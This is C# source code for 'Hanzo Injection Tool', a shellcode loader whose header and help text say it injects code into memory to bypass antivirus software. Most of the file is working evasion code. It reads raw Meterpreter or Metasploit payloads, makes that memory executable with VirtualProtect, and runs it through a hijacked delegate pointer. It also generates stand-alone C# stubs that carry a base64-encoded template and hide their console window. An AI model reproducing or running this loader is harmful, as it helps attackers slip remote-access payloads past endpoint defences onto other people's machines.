/*
 * -----------------------------------------------------------------------------------------------
 * Hanzo Injetion Tool
 * the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions
 * Geeetx: P0cL4bs Team
 * { N4sss , MMXM , kwrnel, MovCode, joridos }
 * Create in: 11/10/2014
 * copyright
 *
 *------------------------------------------------------------------------------------------------
*/
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Globalization;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Threading;
using System.Linq;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace HanzoInjectionTool
{
    class Principal
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("user32.dll")]
        static extern bool SetWindowText(IntPtr hWnd, string windowName);

        public delegate uint Ret1ArgDelegate(uint address);
        static uint PlaceHolder1(uint arg1) { return 0; }


        public static byte[] Payload_remoto(string nomedoarquivo)
        {
            using (Stream meu_arquivo = new FileStream(Environment.CurrentDirectory + "/" +nomedoarquivo,
           FileMode.Open))
            {
                Console.WriteLine("1237674423894");
                var tamanho = meu_arquivo.Length;
                var byteshexa = new byte[tamanho];
                meu_arquivo.Read(byteshexa, 0, (int)tamanho);
                return byteshexa;
            }
        }

        public static byte[] lerpayload(string nome_arquivo)
        {
            using (Stream meu_arquivo = new FileStream(Environment.CurrentDirectory + "/" +nome_arquivo,
           FileMode.Open))
            {
                var tamanho = meu_arquivo.Length;
                var byteshexa = new byte[tamanho];
                meu_arquivo.Read(byteshexa, 0, (int)tamanho);
                return byteshexa;
            }
        }

        public static void memoria_execute(string payload, string nome_arquivo)
        {
            string arquivo = "dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uVGV4dDsNCnVza"+
                "W5nIFN5c3RlbS5HbG9iYWxpemF0aW9uOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5MaW5xOw0KdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOw0KdXN"+
                "pbmcgU3lzdGVtLlRocmVhZGluZzsNCnVzaW5nIFN5c3RlbS5YbWw7DQpuYW1lc3BhY2UgRXhwbG9pdFNoZWxsY29kZUV4ZWMNCnsNCiAgICBjbGFzcyBQcm9ncmFtDQogICAgew0KICAgICAgICBbR"+
                "GxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0NCiAgICAgICAgLy9bRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBib29"+
                "sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KICAgICAgICBwdWJsaWMgZGVsZ"+
                "WdhdGUgdWludCBSZXQxQXJnRGVsZWdhdGUodWludCBhZGRyZXNzKTsNCiAgICAgICAgc3RhdGljIHVpbnQgUGxhY2VIb2xkZXIxKHVpbnQgYXJnMSkgeyByZXR1cm4gMDsgfQ0KICAgICAgICBbRGx"+
                "sSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOw0KDQogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NC"+
                "iAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFNob3dXaW5kb3coSW50UHRyIGhXbmQsIGludCBuQ21kU2hvdyk7DQoNCiAgICAgICAgY29uc3QgaW50IFNXX0hJREUgPSAwOw0KICAgICAgICBjb25"+
                "zdCBpbnQgU1dfU0hPVyA9IDU7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGxlcnBheWxvYWQoc3RyaW5nIG5vbWVfYXJxdWl2bykNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgK"+
                "FN0cmVhbSBtZXVfYXJxdWl2byA9IG5ldyBGaWxlU3RyZWFtKEVudmlyb25tZW50LkN1cnJlbnREaXJlY3RvcnkgKyAiLyIgK25vbWVfYXJxdWl2bywNCiAgICAgICAgICAgRmlsZU1vZGUuT3Blbik"+
                "pDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIHRhbWFuaG8gPSBtZXVfYXJxdWl2by5MZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5dGVzaGV4YSA9IG5ldyBieXRlW3Rhb"+
                "WFuaG9dOw0KICAgICAgICAgICAgICAgIG1ldV9hcnF1aXZvLlJlYWQoYnl0ZXNoZXhhLCAwLCAoaW50KXRhbWFuaG8pOw0KICAgICAgICAgICAgICAgIHJldHVybiBieXRlc2hleGE7DQogICAgICA"+
                "gICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgaGFuZGxlID0gR2V0Q29uc"+
                "29sZVdpbmRvdygpOw0KDQogICAgICAgICAgICAvLyBIaWRlDQogICAgICAgICAgICBTaG93V2luZG93KGhhbmRsZSwgU1dfSElERSk7DQogICAgICAgICAgICBzdHJpbmcgaGV4YUJpbnBheWxvYWQ"+
                "gPSAibWluaGFfc3RyaW5nIjsNCiAgICAgICAgICAgIGJ5dGVbXSBzaGVsbGNvZGVoZXggPSBIZXhTdHJpbmdUb0J5dGVBcnJheShoZXhhQmlucGF5bG9hZCk7DQogICAgICAgICAgICBDb25zb2xlL"+
                "ldyaXRlTGluZSgiZXhjdXRhbmRvLi4uIik7DQogICAgICAgICAgICBleGVjdXRhcihzaGVsbGNvZGVoZXgpOw0KICAgICAgICB9DQoNCiAgICAgICAgIHB1YmxpYyBzdGF0aWMgYnl0ZVtdIEhleFN"+
                "0cmluZ1RvQnl0ZUFycmF5KHN0cmluZyBIZXgpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBCeXRlcyA9IG5ldyBieXRlW0hleC5MZW5ndGggLyAyXTsNCiAgICAgICAgICAgIGludFtdI"+
                "HZhbG9yZXMgPSBuZXcgaW50W10geyAweDAwLCAweDAxLCAweDAyLCAweDAzLCAweDA0LCAweDA1LCANCiAgICAgICAweDA2LCAweDA3LCAweDA4LCAweDA5LCAweDAwLCAweDAwLCAweDAwLCAweDA"+
                "wLCAweDAwLCAweDAwLCAweDAwLCANCiAgICAgICAweDBBLCAweDBCLCAweDBDLCAweDBELCAweDBFLCAweDBGIH07DQoNCiAgICAgICAgICAgIGZvciAoaW50IHggPSAwLCBpID0gMDsgaSA8IEhle"+
                "C5MZW5ndGg7IGkgKz0gMiwgeCArPSAxKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEJ5dGVzW3hdID0gKGJ5dGUpKHZhbG9yZXNbQ2hhci5Ub1VwcGVyKEhleFtpICsgMF0pIC0gJzA"+
                "nXSA8PCA0IHwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWxvcmVzW0NoYXIuVG9VcHBlcihIZXhbaSArIDFdKSAtICcwJ10pOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgI"+
                "CAgICByZXR1cm4gQnl0ZXM7DQogICAgICAgIH0NCg0KICAgICAgICB1bnNhZmUgcHVibGljIHN0YXRpYyB2b2lkIGV4ZWN1dGFyKGJ5dGVbXSBhc21CeXRlcykNCiAgICAgICAgew0KICAgICAgICA"+
                "gICAgZml4ZWQgKGJ5dGUqIHN0YXJ0QWRkcmVzcyA9ICZhc21CeXRlc1swXSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gcGVnYW5kbyBmZWlsZGluZm8gZG8gbcOpdG9kbyAiX"+
                "21ldGhvZFB0ciINCiAgICAgICAgICAgICAgICBUeXBlIGRlbFR5cGUgPSB0eXBlb2YoRGVsZWdhdGUpOw0KICAgICAgICAgICAgICAgIEZpZWxkSW5mbyBfbWV0aG9kUHRyID0gZGVsVHlwZS5HZXR"+
                "GaWVsZCgiX21ldGhvZFB0ciIsIEJpbmRpbmdGbGFncy5Ob25QdWJsaWMgfA0KICAgICAgICAgICAgICAgQmluZGluZ0ZsYWdzLkluc3RhbmNlKTsNCiAgICAgICAgICAgICAgICAvLyByZXQgZGVsZ"+
                "WdhZXRlDQogICAgICAgICAgICAgICAgUmV0MUFyZ0RlbGVnYXRlIGRlbCA9IG5ldyBSZXQxQXJnRGVsZWdhdGUoUGxhY2VIb2xkZXIxKTsNCiAgICAgICAgICAgICAgICBfbWV0aG9kUHRyLlNldFZ"+
                "hbHVlKGRlbCwgKEludFB0cilzdGFydEFkZHJlc3MpOw0KICAgICAgICAgICAgICAgIC8vZGVzYWJpbGl0YXIgYSBwcm90ZcOnw6NvIA0KICAgICAgICAgICAgICAgIHVpbnQgb3V0T2xkUHJvdGVjd"+
                "GlvbjsNCiAgICAgICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdCgoSW50UHRyKXN0YXJ0QWRkcmVzcywgKHVpbnQpYXNtQnl0ZXMuTGVuZ3RoLCAweDQwLCBvdXQgb3V0T2xkUHJvdGVjdGlvbik7DQo"+
                "gICAgICAgICAgICAgICAgLy8gZXhldHV0YXIgc2hlbGxjb2RlDQogICAgICAgICAgICAgICAgdWludCBuID0gKHVpbnQpMHgwMDAwMDAwMTsNCiAgICAgICAgICAgICAgICBuID0gZGVsKG4pOw0KI"+
                "CAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MDp4fSIsIG4pOw0KICAgICAgICAgICAgICAgIENvbnNvbGUuUmVhZEtleSgpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgIH0NCiA"+
                "gICB9DQp9DQo=";
            string adicionar_bytes_encode = Base64Decode(arquivo);
            byte[] arquivoBytes = File.ReadAllBytes(payload);
            string payload_encode = ByteArrayToHexString(arquivoBytes);
            string arquivo_final = adicionar_bytes_encode.Replace("minha_string", payload_encode);
            string rcode = "dWludCBvdXRPbGRQcm90ZWN0aW9uOw0KICAgICAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0"+
                "KChJbnRQdHIpc3RhcnRBZGRyZXNzLCAodWludClhc21CeXRlcy5MZW5ndGgsIDB4NDAsIG91dCBvdXRPbGR"+
                "Qcm90ZWN0aW9uKTsNCiAgICAgICAgICAgICAgICAvLyBleGV0dXRhciBzaGVsbGNvZGUNCiAgICAgICAgIC"+
                "AgICAgICB1aW50IG4gPSAodWludCkweDAwMDAwMDAxOw0KICAgICAgICAgICAgICAgIG4gPSBkZWwobik7D"+
                "QogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswOnh9Iiwgbik7DQogICAgICAgICAgICAg"+
                "ICAgQ29uc29sZS5SZWFkS2V5KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgfQ0KICAgIH0NCn0=";
            string final = Base64Decode(rcode);
            System.IO.StreamWriter file = new System.IO.StreamWriter(nome_arquivo);
            file.Write(arquivo_final += "/*" + rcode);
            file.Write("*/");
            file.Close();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.WriteLine("Output: " + nome_arquivo);
            Console.WriteLine("[!] Payload: " + payload);
            Console.WriteLine("[#] Encoding: Hex Decoder");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Path:" + Directory.GetCurrentDirectory() + @"\" + nome_arquivo );
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[!] ");
            Console.ResetColor();
            Console.WriteLine("Len: " + arquivo_final.Length);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[*] ");
            Console.ResetColor();
            Console.WriteLine("Generated file with success!");
            Console.ResetColor();

        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static void modo_de_uso()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("Usage: HanzoInjection.exe [Options] [-h] [-e] [-o] [-p] [-b]\n");
            Console.ResetColor();
            Console.WriteLine("the HanzoIjection is a tool focused on injecting arbitrary codes in memory to bypass common antivirus solutions. \n");
            Console.WriteLine("Developer: Mharcos Nesster (mh4x0f)");
            Console.WriteLine("Email:mh4root@gmail.com");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Greetx:  P0cL4bs Team { N4sss , MMXM , Chrislley, MovCode, joridos } ");
            Console.ResetColor();
            Console.WriteLine("-------------------------------------------------------------------\n\n");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("Arguments Options:\n");
            Console.ResetColor();
            Console.WriteLine("        OPTION        TYPE       DESCRIPTION");
            Console.WriteLine("       -e,--execute  [.raw]      Name of file.bin, payload metasploit type raw");
            Console.WriteLine("       -p,--payload  [.raw]      Payload meterpreter type [RAW]  required parameter -o [output]");
            Console.WriteLine("       -o,--output   [file.cs]   Output generate project file.cs injection memory payload c#");
            Console.WriteLine("       -h,--help     [Help]      show this help and exit");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\nExample Usage:\n");
            Console.ResetColor();
            Console.WriteLine("        HanzoInjection.exe -e payload_meterpreter.bin");
            Console.WriteLine("        HanzoInjection.exe -p meterpreter.bin -o injection_memory.cs");
        }
        unsafe static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                modo_de_uso();
            }
            if (args.Length == 1)
            {

                if (args.Contains("-h") || (args.Contains("--help")))
                {
                    modo_de_uso();
                }

            }
            if (args.Length == 2)
            {

                if (args.Contains("-e") || args.Contains("--execute"))
                {
                    string arquivo = args[1];
                    Console.WriteLine("[!] Executing payload: ");
                    byte[] converterfuncao = lerpayload(arquivo);
                    executar(converterfuncao);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.Write("[*] ");
                    Console.ResetColor();
                    Console.WriteLine("Binary Executed!");

                }

            }
            if (args.Length == 4)
            {
                if (args.Contains("-p") || (args.Contains("--payload")))
                {
                    string payload;
                    payload = args[1];
                    string arquivo_criar;
                    arquivo_criar = args[3];
                    if (args[2] == "-o" || args[2] == "--output")
                    {
                        memoria_execute(payload, arquivo_criar);
                    }
                }
            }
        }
        // conveter string
        public static byte[] HexStringToByteArray(string Hex)
        {
            byte[] Bytes_convertidos = new byte[Hex.Length / 2];
            int[] valores = new int[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05,
       0x06, 0x07, 0x08, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
       0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };

            for (int x = 0, i = 0; i < Hex.Length; i += 2, x += 1)
            {
                Bytes_convertidos[x] = (byte)(valores[Char.ToUpper(Hex[i + 0]) - '0'] << 4 |
                                  valores[Char.ToUpper(Hex[i + 1]) - '0']);
            }

            return Bytes_convertidos;
        }


        // conveter bytes
        public static string ByteArrayToHexString(byte[] Bytes)
        {
            StringBuilder Resultado = new StringBuilder(Bytes.Length * 2);
            string Hex_numeros = "0123456789ABCDEF";

            foreach (byte B in Bytes)
            {
                Resultado.Append(Hex_numeros[(int)(B >> 4)]);
                Resultado.Append(Hex_numeros[(int)(B & 0xF)]);
            }

            return Resultado.ToString();
        }


        public static void injetarmemeoria(byte[] bin)
        {

            // converte os bin para assembly
            Assembly a = Assembly.Load(bin);
            // chama o entrypoint
            MethodInfo metodo_de_entrada = a.EntryPoint;
            if (metodo_de_entrada != null)
            {
                object o = a.CreateInstance(metodo_de_entrada.Name);
                // invocar entryPoint
                metodo_de_entrada.Invoke(o, null);
            }
        }
        unsafe public static void executar(byte[] asmBytes)
        {
            fixed (byte* Endereco_incial = &asmBytes[0])
            {
                // pegando feildinfo do método "_methodPtr"
                Type delType = typeof(Delegate);
                FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic |
               BindingFlags.Instance);
                // ret delegaete
                Ret1ArgDelegate Retorno_del = new Ret1ArgDelegate(PlaceHolder1);
                _methodPtr.SetValue(Retorno_del, (IntPtr)Endereco_incial);
                uint protecao_memoria;
                VirtualProtect((IntPtr)Endereco_incial, (uint)asmBytes.Length, 0x40, out protecao_memoria);
                // exetutar shellcode
                uint n_executar = (uint)0x00000001;
                n_executar = Retorno_del(n_executar);
                Console.WriteLine("{0:x}", n_executar);
            }

        }
    }
}
